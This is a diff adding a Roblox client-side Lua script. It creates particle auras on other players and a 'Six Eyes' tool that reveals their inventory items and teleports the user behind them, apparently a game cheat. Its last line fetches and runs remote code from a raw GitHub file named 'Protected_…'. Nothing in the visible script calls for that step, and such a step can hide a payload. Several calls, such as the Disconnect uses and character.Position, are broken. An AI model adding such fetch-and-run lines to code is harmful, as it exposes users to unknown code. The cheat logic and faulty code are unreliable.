+                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+            },
+            [3] = ColorSequence.new{
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(5, 207, 247)), -- Blue
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+            },
+            [4] = ColorSequence.new{
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)), -- Green
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+            }
+        }
+
+        -- Function to select a random color
+        local function getRandomColor()
+            local randomChance = math.random(1, 100)
+            if randomChance <= 10 then
+                return 1 -- No particle (10% chance)
+            elseif randomChance <= 30 then
+                return 2 -- Purple (20% chance)
+            elseif randomChance <= 70 then
+                return 3 -- Blue (40% chance)
+            else
+                return 4 -- Green (30% chance)
+            end
+        end
+
+        -- Make the VFX continuously visible
+        local colorIndex = getRandomColor()
+        if colorIndex == 1 then
+            return -- No particle effect
+        end
+
+        for _, child in ipairs(attachment:GetChildren()) do
+            if child:IsA("ParticleEmitter") then
+                child.Color = colors[colorIndex] -- Set the selected color
+                child.Lifetime = NumberRange.new(0.3) -- Set the lifetime of particles
+                child.Rate = 20 -- Initial rate
+                child:Emit(20) -- Initial burst of particles
+
+                -- Continuously update the rate every 5 seconds
+                task.spawn(function()
+                    while effectActive do
+                        task.wait(5) -- Wait for 5 seconds
+                        child.Rate = 20 -- Set the rate to 1 particle per second
+                    end
+                end)
+            end
+        end
+
+        -- Customizable size variables
+        local initialSize = 10 -- Initial size when health is 100
+        local endSize = 0 -- Size when health is 0
+        local sizeStep = 1 -- Amount to decrease per 10 health loss
+
+        -- Function to update size based on health
+        local function updateSizeBasedOnHealth()
+            local humanoid = character:FindFirstChild("Humanoid")
+            if not humanoid then return end
+
+            humanoid.HealthChanged:Connect(function(currentHealth)
+                -- Calculate the new size based on health thresholds
+                local healthPercentage = math.floor(currentHealth / 10) -- Divide health by 10 and floor it
+                local newSize = math.max(initialSize - (10 - healthPercentage) * sizeStep, endSize)
+
+                -- Update the size of the particle emitters
+                for _, child in ipairs(attachment:GetChildren()) do
+                    if child:IsA("ParticleEmitter") then 
+                        child.Size = NumberSequence.new(newSize) -- Set the new size
+                    end
+                end
+            end)
+        end
+
+        -- Start monitoring health changes
+        updateSizeBasedOnHealth()
+    else
+        warn("No HumanoidRootPart found in character.")
+    end
+end
+
+local function createEffectForPlayer(player)
+    -- Exclude the local player from receiving the effect
+    if player == localPlayer then return end
+
+    -- Apply the effect when the player's character is loaded or respawned
+    if player.Character then
+        createEffectForCharacter(player.Character)
+    end
+    player.CharacterAdded:Connect(createEffectForCharacter)
+end
+
+local function toggleEffect()
+    effectActive = not effectActive
+    if effectActive then
+        -- Apply the effect to all players currently in the game
+        for _, player in ipairs(Players:GetPlayers()) do
+            createEffectForPlayer(player)
+        end
+
+        -- Apply the effect to players who join in the future
+        Players.PlayerAdded:Connect(createEffectForPlayer)
+    else
+        -- Remove the effect from all players
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.Character then
+                local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                if humanoidRootPart then
+                    local attachment = humanoidRootPart:FindFirstChild("PowerUpAuraAttachment")
+                    if attachment then
+                        attachment:Destroy()
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Function to handle character death
+local function onCharacterRemoving(character)
+    if effectActive then
+        effectActive = false -- Deactivate the effect
+        -- Remove the effect from the character
+        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart then
+            local attachment = humanoidRootPart:FindFirstChild("PowerUpAuraAttachment")
+            if attachment then
+                attachment:Destroy()
+            end
+        end
+    end
+end
+
+-- Listen for the local player's character removal
+localPlayer.CharacterRemoving:Connect(onCharacterRemoving)
+
+-- Tool Activation
+local Players = game:GetService("Players")
+local Tool = Instance.new("Tool")
+Tool.Name = "Six Eyes"
+Tool.RequiresHandle = false -- No handle required
+Tool.Parent = game.Players.LocalPlayer:WaitForChild("Backpack")
+Tool.Activated:Connect(toggleEffect)
+local sixEyesActive = false -- Toggle state for Six Eyes
+local grayscaleEffect -- Variable to hold the ColorCorrectionEffect
+local teleportActive = false -- To limit teleportation after health decrease
+local teleportDistance = 10 -- Max teleport distance
+
+-- Function to update tool names beside the player's avatar
+local function updateToolText(player)
+    local character = player.Character
+    if not character then return end
+
+    -- Find or create a BillboardGui to show the tools
+    local toolDisplay = character:FindFirstChild("ToolDisplay")
+    if not toolDisplay then
+        toolDisplay = Instance.new("BillboardGui")
+        toolDisplay.Name = "ToolDisplay"
+        toolDisplay.Size = UDim2.new(2, 0, 4, 0) -- Adjusted height to fit multiple text labels
+        toolDisplay.StudsOffset = Vector3.new(3, 2, 0) -- Offset to the right of the avatar
+        toolDisplay.Adornee = character:WaitForChild("Head")
+        toolDisplay.Parent = character
+    else
+        -- Clear existing TextLabels if they exist
+        for _, child in pairs(toolDisplay:GetChildren()) do
+            if child:IsA("TextLabel") then
+                child:Destroy()
+            end
+        end
+    end
+
+    -- Get the player's backpack and list the tools
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        local toolCount = 0
+        for _, item in pairs(backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                toolCount = toolCount + 1
+
+                -- Create a new TextLabel for each tool
+                local toolText = Instance.new("TextLabel")
+                toolText.Name = "ToolText" .. toolCount
+                toolText.Size = UDim2.new(1, 0, 0.2, 0) -- Smaller size for each label
+                toolText.Position = UDim2.new(0, 0, (toolCount - 1) * 0.2, 0) -- Offset vertically for each tool
+                toolText.BackgroundTransparency = 1
+                toolText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+                toolText.TextScaled = true
+                toolText.Text = item.Name
+                toolText.Parent = toolDisplay
+            end
+        end
+    end
+end
+
+-- Function to set up event listeners for when tools are added/removed from the backpack
+local function setupBackpackListeners(player)
+    local backpack = player:WaitForChild("Backpack")
+
+    -- Listen for when a tool is added to the backpack
+    backpack.ChildAdded:Connect(function()
+        if sixEyesActive then
+            updateToolText(player)
+        end
+    end)
+
+    -- Listen for when a tool is removed from the backpack
+    backpack.ChildRemoved:Connect(function()
+        if sixEyesActive then
+            updateToolText(player)
+        end
+    end)
+end
+
+-- Function to handle health changes
+local function onHealthChanged(newHealth)
+    local player = Players.LocalPlayer
+    local humanoid = player.Character:FindFirstChild("Humanoid")
+
+    if humanoid and newHealth < humanoid.MaxHealth and not teleportActive then
+        teleportActive = true -- Set to true to limit further teleports
+        local character = player.Character
+        local newPos = character.Position + (character.CFrame.LookVector * -5) -- Teleport backward
+        character:MoveTo(newPos)
+
+        wait(1) -- Wait for a cooldown before allowing another teleport
+        teleportActive = false -- Allow teleportation again after cooldown
+    end
+end
+
+-- Function to handle touch events
+local function onTouch(otherPart)
+    local player = Players.LocalPlayer
+    local character = player.Character
+
+    if otherPart and otherPart.Parent and otherPart.Parent:FindFirstChild("Humanoid") then
+        local touchedPlayer = otherPart.Parent
+        if touchedPlayer ~= character then
+            local newPos = touchedPlayer.PrimaryPart.Position + (touchedPlayer.PrimaryPart.CFrame.LookVector * -5) -- Teleport behind
+            character:MoveTo(newPos)
+        end
+    end
+end
+
+-- Function to handle touch events with models/objects
+local function onModelTouch(otherPart)
+    local player = Players.LocalPlayer
+    local character = player.Character
+
+    if otherPart and otherPart:IsA("Part") then
+        local nearestPlayer = nil
+        local shortestDistance = teleportDistance
+        for _, otherPlayer in pairs(Players:GetPlayers()) do
+            if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("Humanoid") then
+                local distance = (otherPlayer.Character.PrimaryPart.Position - character.PrimaryPart.Position).Magnitude
+                if distance < shortestDistance then
+                    shortestDistance = distance
+                    nearestPlayer = otherPlayer
+                end
+            end
+        end
+
+        if nearestPlayer then
+            local newPos = nearestPlayer.Character.PrimaryPart.Position + (nearestPlayer.Character.PrimaryPart.CFrame.LookVector * -5) -- Teleport behind nearest player
+            character:MoveTo(newPos)
+        end
+    end
+end
+
+-- Toggle the Six Eyes functionality
+local function toggleSixEyes()
+    sixEyesActive = not sixEyesActive
+    local player = Players.LocalPlayer
+    local character = player.Character
+
+    if sixEyesActive then
+        local camera = workspace.CurrentCamera
+
+        if not grayscaleEffect then
+            grayscaleEffect = Instance.new("ColorCorrectionEffect")
+            grayscaleEffect.Name = "GrayscaleEffect"
+            grayscaleEffect.Saturation = 0
+            grayscaleEffect.Parent = camera
+        end
+
+        -- Monitor health changes
+        local humanoid = character:WaitForChild("Humanoid")
+        humanoid.HealthChanged:Connect(onHealthChanged)
+
+        -- Connect touch events for limbs and models/objects
+        character.Hitbox.Touched:Connect(onTouch) -- For limb touches
+        character.Hitbox.Touched:Connect(onModelTouch) -- For model/object touches
+
+        -- Update tool text for the local player immediately after activation
+        updateToolText(player)
+
+        -- Update tool text for all players currently in the game
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character then
+                updateToolText(player)
+            end
+        end
+    else
+        -- Cleanup when deactivated
+        if grayscaleEffect then
+            grayscaleEffect:Destroy() -- Remove the grayscale effect
+            grayscaleEffect = nil
+        end
+
+        -- Clear tool display from all players
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character then
+                local toolDisplay = player.Character:FindFirstChild("ToolDisplay")
+                if toolDisplay then
+                    toolDisplay:Destroy() -- Remove the tool display for other players
+                end
+            end
+        end
+
+        -- Disconnect the health change listener and teleport functions
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.HealthChanged:Disconnect(onHealthChanged)
+        end
+        
+        -- Disconnect the touch events
+        character.Hitbox.Touched:Disconnect(onTouch)
+        character.Hitbox.Touched:Disconnect(onModelTouch)
+    end
+end
+
+-- Connect the tool activation to toggle the functionality
+Tool.Activated:Connect(toggleSixEyes)
+
+-- Connect the player-added event to start tracking tools for new players
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        setupBackpackListeners(player) -- Set up listeners for the new player
+    end)
+end)
+
+-- Update for all players currently in the game
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Character then
+        setupBackpackListeners(player) -- Set up listeners for existing players
+    end
+end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/motonik-heldoaxxyy/Project-9393-_-2-8-_-93-_04-2-9-38-8_-8-/refs/heads/main/Protected_8655587436835511.txt'))()
